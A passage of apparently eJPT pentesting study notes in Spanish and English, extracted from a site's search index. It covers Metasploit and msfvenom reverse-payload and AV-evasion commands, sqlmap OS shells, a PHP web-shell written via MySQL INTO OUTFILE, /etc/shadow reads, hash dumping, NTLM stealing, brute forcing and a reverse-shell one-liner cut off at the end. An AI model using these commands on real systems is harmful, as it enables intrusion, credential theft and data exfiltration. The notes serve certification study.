-z\n```\n\n- Run the exploit in the background expecting one or more sessions that are immediately backgrounded:\n\n```bash\nmsf &gt; exploit \u2013j\n```\n\n- List all current jobs\u00a0`exploit listeners`:\n\n```bash\nmsf &gt; jobs \u2013l\n```\n\n- Kill a job:\n\n```bash\nmsf &gt; jobs \u2013k [JobID]\n```\n</code></pre> </li> <li> <p>Multiple Sessions</p> <pre><code>- List all backgrounded sessions:\n\n```bash\nmsf &gt; sessions -l\n```\n\n- Interact with a backgrounded session:\n\n```bash\nmsf &gt; session -i [SessionID]\n```\n\n- Background the current interactive session:\n\n```bash\nmeterpreter &gt; &lt;Ctrl+Z&gt;\n```\n\nor\n\n```bash\nmeterpreter &gt; background\n```\n\n- Routing Through Sessions:\n\nAll modules against the target subnet mask will be pivoted through this session.\n\n```bash\nmsf &gt; route add [Subnet to Route To]\n[Subnet Netmask] [SessionID]\n```\n</code></pre> </li> </ul> </li> <li> <p>Msfvenom</p> <pre><code>$ msfvenom \u2013p [PayloadPath]\n\u2013f [FormatType]\nLHOST=[LocalHost (if reverse conn.)]\nLPORT=[LocalPort]\n</code></pre> <ul> <li> <p>Example: Reverse Meterpreter payload as an executable and redirected into a file:</p> <pre><code>$ msfvenom -p windows/meterpreter/\nreverse_tcp -f exe LHOST=192.168.1.1\nLPORT=4444 &gt; met.exe\n</code></pre> </li> <li> <p>Format Options\u00a0(specified with \u2013f)\u00a0--help-formats \u2013 List available output formats</p> <ul> <li><code>exe</code>\u00a0\u2013 Executable</li> <li><code>pl</code>\u00a0\u2013 Perl</li> <li><code>rb</code>\u00a0\u2013 Ruby</li> <li><code>raw</code>\u00a0\u2013 Raw shellcode</li> <li><code>c</code>\u00a0\u2013 C code</li> </ul> </li> <li> <p>Encoding Payloads with msfvenom</p> <p>msfvenom can be used to apply a level of encoding for anti-virus bypass. For example run msfvenom with\u00a0<code>-l encoders</code>\u00a0to get a list of encoders.</p> <pre><code>$ msfvenom -p [Payload] -e [Encoder] -f\n[FormatType] -i [EncodeInterations]\nLHOST=[LocalHost (if reverse conn.)]\nLPORT=[LocalPort]\n</code></pre> </li> <li> <p>Example: Encode a payload from msfpayload 5 times using shikata-ga-nai encoder and output as executable:</p> <pre><code>$ msfvenom -p windows/meterpreter/\nreverse_tcp -i 5 -e x86/shikata_ga_nai -f\nexe LHOST=192.168.1.1 LPORT=4444 &gt; mal.exe\n</code></pre> </li> </ul> </li> <li> <p>Pentesting CI/CD</p> <ul> <li> <p>Jenkins Security</p> <p>Enumeration</p> <pre><code>msf&gt; use auxiliary/scanner/http/jenkins_enum\n</code></pre> <p>Execute commands without authentication</p> <pre><code>msf&gt; use auxiliary/scanner/http/jenkins_command\n</code></pre> </li> </ul> </li> <li> <p>Gestores de Contenido</p> <p>WordPress</p> <p>Enumeraci\u00f3n general WordPress</p> <p>Enumerar usuarios</p> <pre><code>wpscan --url http://exmaple.com -e u\n-u : username\n-p: password\n</code></pre> <p>Fuerza burta usuario</p> <pre><code>wpscan --url http://exmaple.com -U usuario -P /usr/share/wordlists/rockyou.txt\n</code></pre> <p>Plugin scan</p> <pre><code>wpscan --uel http://example.con -e u,p --api-toke='API'\n# La API la sacanos del perfil de nuestra cuenta de Webscan\n\nwpscan --uel http://example.con -e u,p --api-toke='API' --plugibs.detection aggressive -L 50\n\n# Modo deteccion agresivo con 50 hilos\n</code></pre> <p>Fuzzear Plugins WordPress</p> <pre><code>git clone https://github.com/Perfectdotexe/WordPress-Plugins-List.git\nplugins.txt\n\nProbar el listado de plugins en el directorio mediante fuzzing web\n\ngobuster dir -u 'http://example.com/wp-content/plugins' -w plugins.txt\n</code></pre> <pre><code> wpscan --url http://example -P /usr/share/wordlists/rockyou.txt\n\n# Ignore TLS check (--disable-tls-checks)\nwpscan --url https://example.com -P wordlist.txt --disable-tls-checks\n\n# -U : Specifify username\n# --rua: random user agent\n# --http-auth username:password\n# -e: enumerate\n#  ap: All plugins\n#  at: All themes\n#  tt: Timthumbs\n#  cb: Config backups\n#  dbe: Db exports\n#  u: User IDs range\n#  m: Media IDs range\n\nwpscan --rua -e ap,at,tt,cb,dbe,u,m --url https://example.com -U username -P /usr/share/wordlists/rockyou.txt\n</code></pre> <p>Common directories</p> <pre><code>/author/admin/\n/index.php/author/admin/\n/license.txt\n/readme.html\n/robots.txt\n\n/wp-admin/\n/wp-admin/admin-ajax.php\n/wp-admin/upload.php\n/wp-content/\n/wp-content/uploads/\n/wp-includes/\n/wp-json/wp/v1/\n/wp-json/wp/v1/users\n/wp-json/wp/v2/\n/wp-json/wp/v2/users\n/wp-login.php\n\n# Users\n/?author=1\n/?author=2\n\n# Posts\n/?p=1\n/?p=2\n\n# Private/Draft Posts (WordPress &lt;= 5.2.3) \n/?static=1\n</code></pre> <p>Parametro busqueda WordPress</p> <pre><code># Todos los WordPress presnetan un parametro de busqueda \nhttp://example.es/course/\n\n/s=\n\nhttp://example.es/course/s=Cadena a buscar\n\n# Si buscamos cadenas huerfanas podemos acceder a recursos que normalmente\n# no podriamos.\n</code></pre> <p>Mongo</p> <pre><code>#Conexi\u00f3n remotoa BD\n\nmongo &lt;target-IP&gt;:&lt;port&gt;\n\nshow dbs # Muestra las bases de datos\nuse db # selecciona la base de datos para trabajar\nshow collections # Muestra contenido de la bd (ex:admin,config)\ndb.admin.find() # Muestra contenido de la tabla\ndb.admin.find().pretty()# Muestra el contenido de la tabla en formato leible\n</code></pre> <p>Drupal</p> <p>Drupa IP</p> <pre><code>whatweb http://example.com\n</code></pre> <p>Metasploit</p> <p><pre><code>Drupa &lt;=8 vulnerable\n\nmsf&gt; search drupal 8\n\nUna vez explotado, enumerar Drupal\n\nshell&gt; find / -name settings.php 2&gt;/dev/null\n/var/www/html/sites/default/settings.php\n\nBuscar credenciales en el fichero de configuraci\u00f3n\n</code></pre> - SQLMap</p> <p>Eunumerar BD</p> <pre><code># Conocer las bases de datos.\n\nsqlmap -u 'http://&lt;IP m\u00e1quina v\u00edctima&gt;' --forms --dbs --batch\n\n# Conocer las tablas de la BD (Ex: Webapp)\n\nsqlmap -u 'http://&lt;IP m\u00e1quina v\u00edctima&gt;' --forms -D Webapp --tables --batch\n\n# Conocer las columnas de la tabla de la BD\n\nsqlmap -u 'http://&lt;IP m\u00e1quina v\u00edctima&gt;' --forms -D Webapp -T Users --columns --batch\n\n# Conocer la informaci\u00f3n que hay en esas columnas (ex: username,password)\n\nsqlmap -u 'http://&lt;IP m\u00e1quina v\u00edctima&gt;' --forms -D Webapp -T Users -C username,password --dump --batch\n</code></pre> <p>Para parametros que sabemos vulnerables</p> <pre><code>sqlmap -u 'http://victim.site/view.php?id=1141' -p id\n</code></pre> <p>Cuando estamos autenticados como alg\u00fan usuario, </p> <pre><code>sqlmap -u 'http://victim.site/dashboard.php?search=1' --cookie \"PHPSESSID=a3tqcq298ggfth9njj2mgg6ch1\"\n</code></pre> <p>Para ejecutar comandos de sistema:</p> <pre><code>sqlmap -u 'http://victim.site/dashboard.php?search=1' --os-shell\n</code></pre> </li> </ul>"},{"location":"Apuntes/eJPT/MieJPTv2/#enumeracion","title":"Enumeracion","text":""},{"location":"Apuntes/eJPT/MieJPTv2/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":""},{"location":"Apuntes/eJPT/MieJPTv2/#port-21-ftp","title":"Port 21 | FTP","text":"<p>Conexi\u00f3n con usuario an\u00f3nimo por defecto:</p> <pre><code>ftp &lt;IP&gt;\n&gt;anonymous\n&gt;anonymous\n</code></pre> <p>Escaneo con Nmap para servicio FTP</p> <pre><code># Enumeraci\u00f3n versi\u00f3n ftp\n\nnmap -sV -p 21 --open &lt;IP&gt;\n\n# Verificar conexi\u00f3n anonima\n\nnmap --script=ftp-anon -p21 10.10.14.12\n\n# Todos los scripts de nmap para puerto 21\n\nnmap --script ftp-* -p 21 &lt;IP&gt;\n\n# Para ver los scripts relacionados con FTP\n\nfind / -type f -name ftp* 2&gt;/dev/null | grep scripts\n\n/usr/share/nmap/scripts/ftp-syst.nse\n/usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse\n/usr/share/nmap/scripts/ftp-vuln-cve2010-4221.nse\n/usr/share/nmap/scripts/ftp-proftpd-backdoor.nse\n/usr/share/nmap/scripts/ftp-bounce.nse\n/usr/share/nmap/scripts/ftp-libopie.nse\n/usr/share/nmap/scripts/ftp-anon.nse\n/usr/share/nmap/scripts/ftp-brute.nse\n</code></pre> <p>Banner grab</p> <pre><code>telnet &lt;IP&gt; 21\nnc &lt;IP&gt; 21\n</code></pre> <p>Descargar  ficheros de un FTP</p> <pre><code># Local\n\nftp&gt; get Directorio\\ archivo.txt\n\n# Remoto\n\nwget -m ftp://anonymous:anonymous@IP\nwget -m --no-passive ftp://anonymous:anonymous@IP\n</code></pre> <p>Subir fichero a FTP</p> <pre><code># Local\ntouch ficehro.txt\n\n# En servidor FTP\nftp&gt; put fichero.txt\n</code></pre> <p>Modulo para metasploit</p> <pre><code>use auxiliary/scanner/ftp/anonymous\n</code></pre> <p>Bruteforce FTP</p> <pre><code># Conociendo usuario\nhydra -l admin -P /usr/share/wordlist/rockyou.txt ftp://192.168.0.1\n\n#Sin conocer user ni password\nhydra -L userlist.txt -P passlist.txt ftp://192.168.0.1\n</code></pre>"},{"location":"Apuntes/eJPT/MieJPTv2/#port-22-ssh","title":"Port  22 | SSH","text":"<p>Conexi\u00f3n ssh</p> <pre><code>nc IP 22\nssh usuario@&lt;IP&gt;\n</code></pre> <p>Banner grabbing</p> <pre><code>nc -vn &lt;IP&gt; 22\n</code></pre> <p>Scripts Nmap</p> <pre><code>find / -type f -name ftp* 2&gt;/dev/null | grep scripts\n</code></pre> <pre><code>nmap -p 22 --script ssh2-enum-algos &lt;TARGET_IP&gt;\nnmap -p 22 --script ssh-hostkey --script-args ssh_hostkey=full &lt;TARGET_IP&gt;\nnmap -p 22 --script ssh-auth-methods --script-args=\"ssh.user=&lt;USER&gt;\" &lt;TARGET_IP&gt;\nnmap -p 22 --script=ssh-run --script-args=\"ssh-run.cmd=cat /home/student/FLAG, ssh-run.username=&lt;USER&gt;, ssh-run.password=&lt;PW&gt;\" &lt;TARGET_IP&gt;\nnmap -p 22 --script=ssh-brute --script-args userdb=&lt;USERS_LIST&gt; &lt;TARGET_IP&gt;\n</code></pre> <p>Modulos Metasploit</p> <pre><code>auxiliary/scanner/ssh/ssh_version\nauxiliary/scanner/ssh/ssh_login\n\n# Fuerza bruta para enumerar usuarios\nmsf&gt; use scanner/ssh/ssh_enumusers\n\n# Fuerza burta para Clave Privada\nmsf&gt; use scanner/ssh/ssh_enumusers\n</code></pre> <p>Bruteforce SSH</p> <pre><code>hydra -l &lt;usuario&gt; -P /usr/share/wordlist/rockyou.txt ssh\n</code></pre>"},{"location":"Apuntes/eJPT/MieJPTv2/#port-23-telnet","title":"Port  23 | Telnet","text":"<p>Conexi\u00f3n telnet</p> <pre><code>telnet &lt;IP&gt;\n</code></pre> <p>Banner grabbing</p> <pre><code>nc -vn &lt;IP&gt; 23\n</code></pre> <p>Scripts nmap</p> <pre><code>nmap -n -sV -Pn --script \"*telnet* and safe\" -p 23 &lt;IP&gt;\n</code></pre>"},{"location":"Apuntes/eJPT/MieJPTv2/#port-25465-smtp","title":"Port 25,465 | SMTP","text":"<p>Conexi\u00f3n SMPT</p> <pre><code>openssl s_client -crlf -connext smtp.examplmail.org:465 #SSl/TLS sin starttls\nopenssl s_client -starttls smtp -crlf -connect smpt.examplemail.org:465\n</code></pre> <p>Banner grabbing </p> <pre><code>nc -vn &lt;IP&gt; 25\n</code></pre> <p>Scripts nmap</p> <pre><code>nmap -p25 --script smtp-commands &lt;IP&gt;\nnmap -p25 --script smtp-open-relay &lt;IP&gt; -v\n</code></pre> <p>Bruteforce smtp</p> <pre><code>#Script Nmp\nnmap --script smtp-enum-users &lt;IP&gt;\n\n# Modulo metasploit enumerar usuarios por fuerza bruta\nauxiliary/scanner/smtp/smtp_enum\n</code></pre>"},{"location":"Apuntes/eJPT/MieJPTv2/#port-80-443-pentesting-web","title":"Port  80, 443 | Pentesting Web","text":"<p>Web Pentesting</p>"},{"location":"Apuntes/eJPT/MieJPTv2/#port-137138139-netbios","title":"Port  137,138,139 | NetBios","text":"<p>Enumerar servicio NetBios </p> <pre><code>nmblookup -A &lt;IP&gt;\nnbtscan &lt;IP&gt;/30\nsudo nmap -sU -sV -T4 --script nbstat.nse -p137 -Pn -n &lt;IP&gt;\n</code></pre>"},{"location":"Apuntes/eJPT/MieJPTv2/#port-139-445-smb","title":"Port 139, 445 | SMB","text":"<p>Enumeraci\u00f3n automatica con Enum4linux</p> <pre><code>enum4linux -a target_ip\n\nenum4linux -a [-u \"&lt;username&gt;\" -p \"&lt;passwd&gt;\"] &lt;IP&gt;\nenum4linux-ng -A [-u \"&lt;username&gt;\" -p \"&lt;passwd&gt;\"] &lt;IP&gt;\n</code></pre> <p>Enumeraci\u00f3n con nmap</p> <pre><code>nmap --script \"safe or smb-enum-*\" -p 445 &lt;IP&gt;\nnmap --script=smb-enum-users,smb-os-discovery,smb-enum-shares,smb-enum-groups,smb-enum-domains &lt;IP&gt; -p 135,139,445 -v\nnmap -p445 --script=smb-vuln-* &lt;IP&gt; -v\n</code></pre> <p>Escanear una red en busca de hosts</p> <pre><code>nbtscan -r &lt;IP&gt;/24\n</code></pre> <p>Para poder usar algun exploit para smb, necesitamos conocer la versi\u00f3n. Podemos hacerlo con el mod\u00falo de metasploit:</p> <pre><code>MSF _auxiliary/scanner/smb/smb_version\n\nBuscar exploit:\n\nmsf&gt; search type:exploit platform:windows target:2008 smb\nsearchsploit microsoft smb\n</code></pre> <p>Obtener informaci\u00f3n del entorno SMB</p> <pre><code>#Connect to the rpc\nrpcclient -U \"\" -N &lt;IP&gt; #No creds\nrpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash\nrpcclient -U \"username%passwd\" &lt;IP&gt; #With creds\n</code></pre> <p>Listar recursos,  usuarios, grupos,etc</p> <pre><code># SMBClinet (no muestra permisos sobre los recuros)\n\nsmbclient -L &lt;IP&gt;smb -N \n\n- N: null session\n\n# Crackmapexec (listamos recrusos sin disponer de credenciales)\n\ncrackmapexec smb &lt;IP&gt; -u '' -p '' --shares  # Null user\n\ncrackmapexec smb &lt;IP&gt; --users [-u &lt;username&gt; -p &lt;password&gt;]\ncrackmapexec smb &lt;IP&gt; --groups [-u &lt;username&gt; -p &lt;password&gt;]\ncrackmapexec smb &lt;IP&gt; --groups --loggedon-users [-u &lt;username&gt; -p &lt;password&gt;]\n\ncrackmapexec smb &lt;IP&gt; -u 'username' -p 'password' --shares #Guest user\ncrackmapexec smb &lt;IP&gt; -u 'username' -H '&lt;HASH&gt;' --shares #Guest user\n\n# SMBMap\n\nsmbmap -u guest -p \"\" -d . -H &lt;TARGET_IP&gt;\nsmbmap -u &lt;USER&gt; -p '&lt;PW&gt;' -d . -H &lt;TARGET_IP&gt;\nsmbmap -u &lt;USER&gt; -p '&lt;PW&gt;' -H &lt;TARGET_IP&gt; -x 'ipconfig' ## Run a command\nsmbmap -u &lt;USER&gt; -p '&lt;PW&gt;' -H &lt;TARGET_IP&gt; -L ## List all drives\nsmbmap -u &lt;USER&gt; -p '&lt;PW&gt;' -H &lt;TARGET_IP&gt; -r 'C$' ## List dir content\nsmbmap -u &lt;USER&gt; -p '&lt;PW&gt;' -H &lt;TARGET_IP&gt; --upload '/root/sample_backdoor' 'C$\\sample_backdoor' ## Upload a file\nsmbmap -u &lt;USER&gt; -p '&lt;PW&gt;' -H &lt;TARGET_IP&gt; --download 'C$\\flag.txt' ## Download a file\n\n# Metasploit\n\nuse auxiliary/scanner/smb/smb_lookupsid\nset rhosts hostname.local\nrun\n</code></pre> <p>Conectar/Listar carpeta compartida</p> <pre><code># SMBClinet\n\nsmbclient //&lt;IP&gt;/&lt;Folder&gt; -N # Null user\n\nsmbclinet //&lt;IP&gt;/&lt;folder&gt; -U \"username\"\n\n# Smbmap, without folder it list everything\n\nsmbmap [-u \"username\" -p \"password\"] -R [Folder] -H &lt;IP&gt; [-P &lt;PORT&gt;] # Recursive list\nsmbmap [-u \"username\" -p \"password\"] -r [Folder] -H &lt;IP&gt; [-P &lt;PORT&gt;] # Non-Recursive list\nsmbmap -u \"username\" -p \"&lt;NT&gt;:&lt;LM&gt;\" [-r/-R] [Folder] -H &lt;IP&gt; [-P &lt;PORT&gt;] #Pass-the-Hash\n</code></pre> <p>Metasploit modules</p> <pre><code>use auxiliary/scanner/smb/smb_version\nuse auxiliary/scanner/smb/smb_enumusers\nuse auxiliary/scanner/smb/smb_login\nuse auxiliary/scanner/smb/pipe_auditor\n</code></pre> <p>Los nombres de recursos compartidos comunes para objetivos de Windows son</p> <ul> <li>C$</li> <li>D$</li> <li>ADMIN$</li> <li>IPC$</li> <li>PRINT$</li> <li>FAX$</li> <li>SYSVOL</li> <li>NETLOGON</li> </ul> <p>Bruteforce SMB</p> <pre><code>#Nmap\n\nnmap --script smb-brute -p 445 &lt;IP&gt;\n\nhydra -l Administrator -P words.txt &lt;IP&gt; smb -t 1\n</code></pre>"},{"location":"Apuntes/eJPT/MieJPTv2/#port-3306-mysql","title":"Port 3306 | MySQL","text":"<p>Conexi\u00f3n</p> <pre><code># Local\n\nmysql -u root # Conectar como root sin password\nmysql -u root -p # Password requerido\n\n# Remoto\n\nmysql -h &lt;Hostname&gt; -u root\nmysql -h &lt;Hostname&gt; -u root@localhost\n</code></pre> <p>Enumeraci\u00f3n</p> <pre><code># Nmap\n\nnmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 &lt;IP&gt;\n\n# Metasploit\n\nuse auxiliary/scanner/mysql/mysql_schemadump\nuse auxiliary/scanner/mysql/mysql_writable_dirs\nuse auxiliary/scanner/mysql/mysql_file_enum\nuse auxiliary/scanner/mysql/mysql_hashdump\nuse auxiliary/scanner/mysql/mysql_login\n</code></pre> <p>Comandos MySQL</p> <pre><code>show databases;\nuse &lt;database&gt;;\nconnect &lt;database&gt;;\nshow tables;\ndescribe &lt;table_name&gt;;\nshow columns from &lt;table&gt;;\n\nselect version(); #version\nselect @@version(); #version\nselect user(); #User\nselect database(); #database name\n\n# Obtener shell\n\\! sh\n\n#Basic MySQLi\nUnion Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tables\nUnion Select 1,2,3,4,column_name from information_schema.columns where table_name=\"&lt;TABLE NAME&gt;\"\n\n#Read &amp; Write\n## Yo need FILE privilege to read &amp; write to files.\nselect load_file('/var/lib/mysql-files/key.txt'); #Read file\nselect 1,2,\"&lt;?php echo shell_exec($_GET['c']);?&gt;\",4 into OUTFILE 'C:/xampp/htdocs/back.php'\n\n#Try to change MySQL root password\nUPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';\nUPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';\nFLUSH PRIVILEGES;\nquit;\n\n# Mysql client\nhelp\nshow databases;\nuse &lt;DB_NAME&gt;;\nselect count(*) from &lt;TABLE_NAME&gt;;\nselect load_file(\"/etc/shadow\");\n</code></pre> <p>Enumerar permisos MySQL</p> <pre><code>SHOW GRANTS [FOR user];\nSHOW GRANTS;\nSHOW GRANTS FOR 'root'@'localhost';\nSHOW GRANTS FOR CURRENT_USER();\n\n# Get users, permissions &amp; hashes\nSELECT * FROM mysql.user;\n\n#From DB\nselect * from mysql.user where user='root';\n## Get users with file_priv\nselect user,file_priv from mysql.user where file_priv='Y';\n## Get users with Super_priv\nselect user,Super_priv from mysql.user where Super_priv='Y';\n\n# List functions\nSELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION';\n#@ Functions not from sys. db\nSELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION' AND routine_schema!='sys';\n</code></pre> <p>Credenciales</p> <pre><code>cat /etc/mysql/debian.cnf\n\nDentro del archivo: /var/lib/mysql/mysql/user.MYD puedes encontrar todos los hashes de los usuarios de MySQL (los que puedes extraer de mysql.user dentro de la base de datos).\n\nPuedes extraerlos haciendo:\n\nbash\n\ngrep -oaE \"[-_\\.\\*a-Z0-9]{3,}\" /var/lib/mysql/mysql/user.MYD | grep -v \"mysql_native_password\"\n</code></pre>"},{"location":"Apuntes/eJPT/MieJPTv2/#port-1433-mssql","title":"Port 1433 | MSSQL","text":"<p>Enumeraci\u00f3n automatica</p> <pre><code># Nmap\n\nnmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 &lt;IP&gt;\n\n# Metasploit\n\nmsf&gt; use auxiliary/scanner/mssql/mssql_ping\n</code></pre> <p>Metasploit (necesita credenciales)</p> <pre><code>#Set USERNAME, RHOSTS and PASSWORD\n#Set DOMAIN and USE_WINDOWS_AUTHENT if domain is used\n\n#Steal NTLM\nmsf&gt; use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder\n\n#Info gathering\nmsf&gt; use admin/mssql/mssql_enum #Security checks\nmsf&gt; use admin/mssql/mssql_enum_domain_accounts\nmsf&gt; use admin/mssql/mssql_enum_sql_logins\nmsf&gt; use auxiliary/admin/mssql/mssql_findandsampledata\nmsf&gt; use auxiliary/scanner/mssql/mssql_hashdump\nmsf&gt; use auxiliary/scanner/mssql/mssql_schemadump\nmsf &gt;use auxiliary/scanner/mssql/mssql_login\n\n#Search for insteresting data\nmsf&gt; use auxiliary/admin/mssql/mssql_findandsampledata\nmsf&gt; use auxiliary/admin/mssql/mssql_idf\n\n#Privesc\nmsf&gt; use exploit/windows/mssql/mssql_linkcrawler\nmsf&gt; use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate\nmsf&gt; use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin\n\n#Code execution\nmsf&gt; use admin/mssql/mssql_exec #Execute commands\nmsf&gt; use exploit/windows/mssql/mssql_payload #Uploads and execute a payload\n\n#Add new admin user from meterpreter session\nmsf&gt; use windows/manage/mssql_local_auth_bypass\n</code></pre>"},{"location":"Apuntes/eJPT/MieJPTv2/#port-873-rsync","title":"Port 873 | Rsync","text":"<p>Banner grabbing</p> <pre><code>nc -nv &lt;IP&gt; 873\n</code></pre> <p>Enumeration nmap</p> <pre><code>nmap -sV --script \"rsync-list-modules\" -p 873 target_host\n</code></pre> <p>Enumeration metasploit</p> <pre><code>msf&gt; use auxiliary/scanner/rsync/modules_list\n</code></pre> <p>Enumerar carpetas compartidas</p> <pre><code>rsync target_host::\n\n#Para archivos y permisos\n\nrsync -av --list-only rsync://target_host/module_name\n\n# Exfiltrar datos:\n\n\u276f rsync -avz target_host::module_name /local/directory/\n</code></pre>"},{"location":"Apuntes/eJPT/MieJPTv2/#port-5432-postgresql","title":"Port 5432 | PostgreSQL","text":"<p>Conectar con psql</p> <pre><code>psql -h &lt;target-host&gt; -p &lt;port&gt; -U &lt;username&gt; -W\n</code></pre> <p>Enumerar </p> <pre><code>nmap -sV -p 5432 &lt;target-host&gt;\n\n# Version\nnmap -sV --script=postgresql-info -p 5432 &lt;target-host&gt;\n</code></pre> <p>Enumerar BD y tablas</p> <pre><code># List all databases\n\\l\n\n# Switch to a database\n\\c &lt;database_name&gt;\n\n# List tables in the current database\n\\dt\n\n# Extract data from a specific table:\nSELECT * FROM &lt;table_name&gt;;\n\n# Dumping Hashes\nSELECT usename, passwd FROM pg_shadow;\n</code></pre> <p>Accessing File System</p> <pre><code>COPY (SELECT * FROM sensitive_table) TO '/tmp/sensitive_data.txt';\n</code></pre> <p>Bruteforce</p> <pre><code>hydra -L userlist.txt -P passlist.txt &lt;target-ip&gt; postgres\n</code></pre>"},{"location":"Apuntes/eJPT/MieJPTv2/#reconocimiento","title":"Reconocimiento","text":""},{"location":"Apuntes/eJPT/MieJPTv2/#network-mapping","title":"Network Mapping","text":"<p>IP</p> <pre><code># Linux\nifconfig\nip a \nip -br -c a\n\n# Windows \nipconfig /all\n\n# Routing Linux\nip route\n\n#Routing Windows\nroute print\n</code></pre> <p>Ports</p> <pre><code># Linux\nnetstat -tunp\nnetstat -tulpn\nnetstt -p tcp -p upd\n\n# Winndows\n\nnetstat -ano\n</code></pre> <p>Barrido de Ip\u2019s (ICMP Discovery/ Ping Scan)</p> <pre><code>nmap -sn 10.10.10.0/24\n\nnmap -n -sn &lt;IP&gt;/24 -oG - | awk '/Up$/{print $2}' &gt;&gt; nmapresults.txt\n\nfping -a -g 10.10.10.0/24 2&gt;/dev/null | tee hosts_activos.txt\n</code></pre> <p>ARP Discovery</p> <pre><code>#Local Linux\nip neighbour\n\n#Local Windows \narp -a\n\n#Arp-scan\n\nnetdiscover -i eth1 -r &lt;IP&gt;/24\narp-scan -I eth1 &lt;IP&gt;/24\n\n# Nmap:\nnmap -n -sn &lt;IP&gt;/24 -PR -oG - | awk '/Up$/{print $2}'\n</code></pre>"},{"location":"Apuntes/eJPT/MieJPTv2/#nmap","title":"Nmap","text":"<p>Nmap Options</p> <pre><code># Options\n\n-p- : Escanea todos los puertos\n-Pn : Desactiva host discovery, asume que el host est\u00e1 activo \n-n  : Desactiva resoluci\u00f3n DNS\n-sn : Descativa escaneo de puertos. Solo verifica host discovery.\n-sL : No escanea, solo lista los nombres de los host\n-F  : Fast mode. Puede omitir servicios en puertos altos.\n-T5 : Velocidad del escanero\n\n# Scan Types\n\n-sS: TCP SYN Scan (aka Stealth Scan)\n-sT: TCP Connect Scan \n-sU: UDP Scan\n-sC: Ejecuta los scripts predeterminados de Nmap\n-sV: Service Version information\n-O: Operating System information\n</code></pre> <p>Escanear un Rango de Red</p> <pre><code>nmap -sn 10.129.2.0/24 -oG hosts_activos.txt\n\n#  10.129.2.0/24: Especifica el rango de red objetivo.\n\n# -sn: Desactiva el escaneo de puertos, realizando solo el descubrimiento de hosts.\n\n# -oA tnet | grep for | cut -d\" \" -f5\n Almacena los resultados en todos los formatos que comienzan con el nombre tnet.\n\n # Para escanear un \u00fanico host:\n\n nmap -sn 10.129.2.18 \n</code></pre> <p>Escanear lista de IP\u2019s:</p> <pre><code>nmap -sn -iL hosts_list.txt\n\n-sn: Desactiva el escaneo de puertos.\n\n-oA tnet | grep for | cut -d\" \" -f5 : Almacena los resultados en todos los formatos que comienzan con el nombre tnet.\n\n-iL hosts.list.txt : Lee los hosts de la lista hosts_list.txt proporcionada.\n</code></pre> <p>Deteccion de SO y versi\u00f3nes de servicios:</p> <pre><code>nmap -Pn -O -sCV &lt;IP&gt;\n\n# Para hacerlo m\u00e1s r\u00e1pido\n#Puertos mas comunues\n\nnmap -Pn -F -T5 -sV -O -sC &lt;IP&gt; -vvv \n\n# Todos los puertos abiertos\n\nnmap -Pn -T4 --open -sS -sC -sV --min-rate-1000 --max-retries-3 -p- -oN output_file 10.10.10.2\n</code></pre> <p>Scan versions</p> <pre><code>nmap -sCV -p- -vvv 10.10.10.10\n</code></pre> <p>UDP Scan</p> <pre><code>nmap -sU -sn -sV 10.10.10\n</code></pre>"},{"location":"Apuntes/eJPT/MieJPTv2/#massscan","title":"MassScan","text":"<p>Escaneo multipe de puertos especificados contra un rango de IP\u2019s</p> <pre><code>sudo masscan -p&lt;port1&gt;,&lt;port2&gt; &lt;ip address/range&gt;\n</code></pre> <p>Escaneo multiple de rango de puertos para varias IP\u2019s:</p> <pre><code>sudo masscan -p&lt;port1&gt;-&lt;portN&gt; &lt;ip address/range&gt;\n</code></pre>"},{"location":"Apuntes/eJPT/MieJPTv2/#procedimiento-1","title":"Procedimiento 1","text":"<pre><code># Network Mapping\n\nfping -a -g 10.10.10.0/24 2&gt;/dev/null | tee hosts_activos.txt\narp-scan -I eth1 &lt;IP&gt;/24\n\n# Nmap\n\nnmap -v -sn 10.129.2.0/24 -oG hosts.txt &amp;&amp; grep hosts.txt | cut -d \" \" -f 2\nnmap -sU -sn &lt;IP&gt;/24 (UDP)\n\nPodemos hacer los escaneos posteriores juntos con la lista anterior o uno por uno.\n\n# Versiones y servicios para todos los puertos\n\nnmap -Pn -O -sCV -vvv &lt;IP&gt;\nnmap -Pn -O -sCV -IL hosts_activos.txt\n\n# Full scan\n\nnmap -p- --open -Pn -sVC -T4 -A -iL hosts.txt -oN allports.txt\n</code></pre>"},{"location":"Apuntes/eJPT/MieJPTv2/#procedimiento-2","title":"Procedimiento 2","text":"<pre><code>Ex: \n\nip a\nnmap -sn 10.0.2.0/24 #manda paquetes ICMP a ese segmento de red\n\n# Hosts: 10.0.2.43 / 10.0.2.45 / 10.0.2.46 / 10.0.2.53 / 10.0.2.55\n\nsudo nmap -sS --min-rate 5000 -p- --open 10.0.2.43,45,46,53,55 -oN port_scan.txt\ngrep '^[0-9]' port_scan.txt | cut -d '/' -f1 | sort -u | xargs | tr ' ' ','\n\n# Puertos : 22,25,45,80,445,135,139,49665,49670\n\nnmap --open -p135,139,22,25,45,445,49665,49670,80 -sC -sV 10.0.2.43,45,46,53,55 -Pn -On full_scan.txt\n</code></pre>"},{"location":"Apuntes/eJPT/MieJPTv2/#explotacion","title":"Explotacion","text":""},{"location":"Apuntes/eJPT/MieJPTv2/#shells","title":"Shells","text":""},{"location":"Apuntes/eJPT/MieJPTv2/#rever-shells","title":"Rever Shells","text":"<p>Bash :</p> <pre><code>  #Cambiar IP / Port \n\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 